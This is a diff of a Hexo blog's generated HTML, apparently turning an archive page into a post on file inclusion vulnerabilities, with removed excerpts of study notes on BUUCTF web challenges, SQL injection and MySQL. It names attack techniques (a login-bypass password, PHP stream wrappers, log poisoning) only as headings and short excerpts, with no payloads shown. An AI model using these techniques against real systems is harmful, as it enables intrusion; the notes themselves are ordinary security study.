-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-01-16T19:21:47+08:00">2025-01-16</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/01/16/sqlab/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
 
-</div>
+    <div id="layoutHelper-comments"></div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/15/Buuctf/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Hexo">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/01/15/Buuctf/"  itemprop="url">
-        Buuctf
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        buuctf笔记前言此笔记用于记录在buuctf web上做题的笔记与题解
-1.[极客大挑战 2019]EasySQL第一题当然是最简单的，一个普通的万能密码即可
+  </article>
 
 
-此关必须输入用户名和密码，应该是提前判定不得为空
-2.[极客大挑战 2019]Havefun本题界面无任何可操作的东西，于是我们可以通过查看界面源代码看下是否有提示
 
 
-我们可以看到注释当$cat&#x3D;’dog’时有输出...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-01-15T22:02:33+08:00">2025-01-15</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/01/15/Buuctf/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/12/sql注入/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Hexo">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/01/12/sql%E6%B3%A8%E5%85%A5/"  itemprop="url">
-        sql注入
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        sql注入笔记前言本笔记用于记录学习SQL注入时的笔记，记录了在sql-labs上使用的各种注入方法。
-1.注入点判断SQL 注入漏洞根据不同的标准，有不同的分类。如按照参数类型可分为两种：数字型和字符型。
-参数类型分类
-
-数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。
-
-如 text.com&#x2F;text.php?id&#x3D;3 对应的sql语句为 sel...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-01-12T13:28:35+08:00">2025-01-12</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/01/12/sql%E6%B3%A8%E5%85%A5/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/03/MySQL/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Hexo">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/01/03/MySQL/"  itemprop="url">
-        MySQL
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        MySQL笔记1.MySQL简介数据库（Database）是按照数据结构来组织、存储和管理数据的仓库。
-每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据。
-我们也可以将数据存储在文件中，但是在文件中读写数据速度相对较慢。
-所以，现在我们使用关系型数据库管理系统（RDBMS）来存储和管理大数据量。所谓的关系型数据库，是建立在关系模型基础上的数据库，借助于集合...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-01-03T17:06:10+08:00">2025-01-03</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/01/03/MySQL/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/02/Python/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Hexo">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/01/02/Python/"  itemprop="url">
-        Python
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-01-02T18:38:49+08:00">2025-01-02</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/01/02/Python/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-  
 
 
-	
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
@@ -2885,97 +2894,48 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       
-<section class="widget blogger desktop mobile pjax">
-  <div class='content'>
     
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">Hexo</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fa-solid fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fa-solid fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-
-    
-  
-
-  
-    
-    
-      
-
-    
-  
-
   
 
 
 <div class="widget-sticky pjax">
 
+  
+  
+
+
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">1.本地文件包含漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">2.php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-file-%E5%8D%8F%E8%AE%AE"><span class="toc-text">1.file:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-php-%E5%8D%8F%E8%AE%AE"><span class="toc-text">2.php:&#x2F;&#x2F;协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-php-filter"><span class="toc-text">1.php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-php-input"><span class="toc-text">2.php:&#x2F;&#x2F;input</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-data-%E5%8D%8F%E8%AE%AE"><span class="toc-text">2.data:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-zip-%E5%8D%8F%E8%AE%AE"><span class="toc-text">3.zip:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Apache%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-text">3.Apache日志文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BD%BF%E7%94%A8"><span class="toc-text">4.配合文件上传使用</span></a></li></ol>
+    </div>
+  </section>
+
+  
+
 </div>
 
 
 <!-- 没有 pjax 占位会报错 万恶的 pjax -->
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
 
   <div class="pjax">
     <!-- pjax占位 -->
@@ -3003,13 +2963,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </aside>
 
 
+
           <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -3018,14 +2979,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     // header
     var l_header=document.getElementById("l_header");
     
-    l_header.classList.remove("show");
+    l_header.classList.add("show");
     
     
       // cover
       var cover_wrapper=document.querySelector('#l_cover .cover-wrapper');
       var scroll_down=document.getElementById('scroll-down');
-      cover_wrapper.id="half";
-      cover_wrapper.style.display="";
+      cover_wrapper.id="none";
+      cover_wrapper.style.display="none";
       scroll_down.style.display="none";
     
   
@@ -3523,7 +3484,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/archives/","name":"Archive"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/archives/2025/","name":"2025"}},{"@type":"ListItem","position":4,"item":{"@id":"http://example.com/archives/2025/1/","name":"1"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/02/04/文件包含漏洞/","name":"文件包含漏洞"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"文件包含漏洞","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","wordCount":0,"datePublished":"2025-02-04T09:25:56.000Z","dateModified":"2025-02-05T03:52:35.169Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
